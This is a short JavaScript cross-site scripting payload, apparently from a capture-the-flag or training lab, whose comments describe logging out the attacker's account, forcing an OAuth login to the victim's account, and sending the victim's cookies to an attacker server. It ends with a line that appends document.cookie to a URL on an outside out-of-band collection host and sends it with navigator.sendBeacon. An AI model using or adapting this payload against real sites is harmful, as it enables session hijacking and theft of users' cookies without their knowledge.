alert("hello")
//Logout Attacker's Account
navigator.sendBeacon("http://sso-eejn99.hackthecert.systems/logout","");

//Login to Victim's Account using oAuth Login
navigator.sendBeacon("http://support-jqn7t8.hackthecert.systems/home","");

//Send cookie to Attacker Server
var link="http://nqhwx9kzzrtevzfyt1mdglga117rvg.oastify.com/VictimCookies="+document.cookie;
navigator.sendBeacon(link,"");
